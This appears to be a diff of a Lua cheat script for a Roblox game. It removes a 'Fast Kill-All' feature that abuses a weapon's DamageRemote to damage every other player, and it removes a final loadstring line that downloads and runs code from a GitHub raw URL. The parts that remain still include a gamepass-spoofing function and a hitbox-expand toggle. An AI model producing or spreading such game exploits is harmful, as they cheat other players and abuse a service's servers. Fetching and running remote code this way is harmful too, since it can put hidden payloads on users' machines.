@@ -88,32 +88,6 @@ function Aura(range)
 
 end
 
-function KillAll()
-    local char = lp.Character
-
-    for i,v in pairs(game:GetService("Players"):GetChildren()) do
-        if v.Name ~= lp.Name then        
-            local EChar = v.Character
-            if EChar then
-                if not lp.Backpack:FindFirstChildOfClass("Tool") then
-                    KitEquip("Mace")
-                end 
-                if char:FindFirstChild("Kawaii Revolver") == nil then 
-                    lp.Backpack:FindFirstChild("Kawaii Revolver").Parent = char 
-                end
-
-                if char:FindFirstChildOfClass("Tool") == nil then return end
-
-                if EChar and EChar:FindFirstChild("Humanoid") and EChar:FindFirstChild("Humanoid").Health >= 1 and not EChar:FindFirstChild("ForceField") then 
-                    char:FindFirstChildOfClass("Tool"):FindFirstChild("DamageRemote"):FireServer(EChar:FindFirstChild("Humanoid"))
-                end
-
-            end
-
-        end 
-    end 
-end
-
 function FreeGamepass(user)
     lp.UserId = user
 end 
@@ -200,7 +174,7 @@ do
 
     Tabs.Main:AddParagraph({
         Title = "Info:",
-        Content = "Equip Kawaii Revolver To Fast Kill"
+        Content = "Kawaii Revolver (Fixed)"
     })
 
 
@@ -211,25 +185,6 @@ do
             FreeGamepass("2205774994")
         end
     })
-
-    local Kill = Tabs.Misc:AddToggle("MyToggle", {Title = "Fast Kill-All", Default = false })
-
-    Kill:OnChanged(function(value)
-		if value then 
-			_G.FastKill = true
-			while _G.FastKill do 
-                if Alive() then
-                    KillAll()
-                    task.wait(0.05)
-                end
-			end
-		else
-			_G.FastKill = false
-		end 
-    end)
-
-
-    
 
     local Kill = Tabs.HitboxExp:AddToggle("MyToggle", {Title = "Hitbox-Expand", Default = false })
 
@@ -308,6 +263,3 @@ Window:SelectTab(1)
 notify("You bad","Touch grass(I Don't know how touch grass)",5)
 
 SaveManager:LoadAutoloadConfig()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
-
